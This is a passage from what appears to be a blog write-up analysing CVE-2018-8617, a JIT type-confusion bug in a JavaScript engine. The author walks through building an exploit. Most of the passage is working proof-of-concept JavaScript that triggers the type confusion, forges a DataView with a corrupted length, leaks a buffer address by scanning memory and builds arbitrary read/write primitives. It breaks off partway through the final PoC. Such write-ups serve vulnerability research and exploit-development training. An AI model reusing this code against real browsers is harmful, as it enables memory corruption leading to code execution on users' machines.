</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="nx">customLength</span><span class="p">,</span> <span class="nx">newBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dvObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">leak_obj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span><span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">dvObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">dvVfptrHeader</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dvType</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">targetObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">42</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">42</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">ptrObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">targetObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">dvVfptrHeader</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">dvType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="nx">b</span><span class="o">:</span><span class="mi">1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">writer</span><span class="p">,</span> <span class="nx">writer</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">customLength</span><span class="p">;</span>      
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">newBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">targetObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">trigger_type_confusion</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">arrBuff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">targetObj</span> <span class="o">=</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="nx">arrBuff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">uniqueSize</span> <span class="o">=</span> <span class="mh">0x13370</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">localDataView</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">uniqueSize</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dynamicDataViewObj</span> <span class="o">=</span> <span class="nx">localDataView</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Created DataView object with corrupted length: &#34;</span> <span class="o">+</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">byteLength</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">addrOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x3158</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">found</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">vtableAddr</span> <span class="o">==</span> <span class="nx">uniqueSize</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] buffer address is: 0x&#34;</span> <span class="o">+</span> <span class="nx">vtableAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;EOF TEST!!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Attach WinDbg now...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">();</span>
</span></span></code></pre></div><p>Once ran, we see we successfully leaked the buffer address, which means we can have a read/write primitive just as strong as Offsecs!</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="alt text" src="/CVE-2018-8617-Analysis/noice.png">

  
</figure>
</p>
<p>This may seem easy to find, however the method of confirming this was difficult. The following code was used to accomplish this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">addrOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">100</span><span class="p">);</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">vtableAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">found</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">addrOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">vtableAddr</span> <span class="o">==</span> <span class="nx">uniqueSize</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">targetObj</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">vtableAddr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] buffer address is: 0x&#34;</span> <span class="o">+</span> <span class="nx">vtableAddr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;EOF TEST!!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">localDataView</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span></span></code></pre></div><p>Once ran, hit enter, then attach. From here we search for a unique sequence that matches where we are reading in memory. Once confirmed we are reading from an address space before the new object, we know we can use the &ldquo;egghunter&rdquo; technique. This can be further seen in the image below.</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="alt text" src="/CVE-2018-8617-Analysis/explained.png">

  
</figure>
</p>

<h2 class="relative group">Creating the read/write primitives 
    <div id="creating-the-readwrite-primitives" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#creating-the-readwrite-primitives" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>With the &ldquo;buffer&rdquo; address known we can now modify it to point to wherever we want. Meaning we have an arbitrary read write however I was WRONG about where the buffer address was located&hellip;</p>
<p>Instead, it was at offset 16 of the previously located buffer.</p>
<p>Below is a better visualization:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="alt text" src="/CVE-2018-8617-Analysis/bruh.png">

  
</figure>
</p>
<p>And below is the PoC code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">addrOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">sizeOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">customDataViewObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dynamicDataViewObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger_type_confusion</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="nx">customLength</span><span class="p">,</span> <span class="nx">newBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">dvObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">leak_obj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span><span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">leak_obj</span><span class="p">,</span> <span class="nx">dvObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">dvVfptrHeader</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dvType</span> <span class="o">=</span> <span class="nx">leak_obj</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">targetObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">42</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">42</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">ptrObj</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">,</span> <span class="nx">targetObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">dvVfptrHeader</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ptrObj</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">dvType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="nx">b</span><span class="o">:</span><span class="mi">1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">writer</span><span class="p">,</span> <span class="nx">writer</span><span class="p">,</span> <span class="nx">ptrObj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">customLength</span><span class="p">;</span>      
</span></span><span class="line"><span class="cl">    <span class="nx">writer</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">newBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">targetObj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">SignedDwordToUnsignedDword</span><span class="p">(</span><span class="nx">sd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nx">sd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">?</span> <span class="nx">sd</span> <span class="o">+</span> <span class="mh">0x100000000</span> <span class="o">:</span> <span class="nx">sd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">readPtr</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">addrOffset</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">SignedDwordToUnsignedDword</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">value</span> <span class="o">+=</span> <span class="nx">SignedDwordToUnsignedDword</span><span class="p">(</span><span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">trigger_type_confusion</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">arrBuff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">customDataViewObj</span> <span class="o">=</span> <span class="nx">createDataViewObject</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="nx">arrBuff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">uniqueSize</span> <span class="o">=</span> <span class="mh">0x133700</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">arrControlBuff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">uniqueSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">localDataView</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="nx">uniqueSize</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dynamicDataViewObj</span> <span class="o">=</span> <span class="nx">localDataView</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">dynamicDataViewObj</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x414141</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
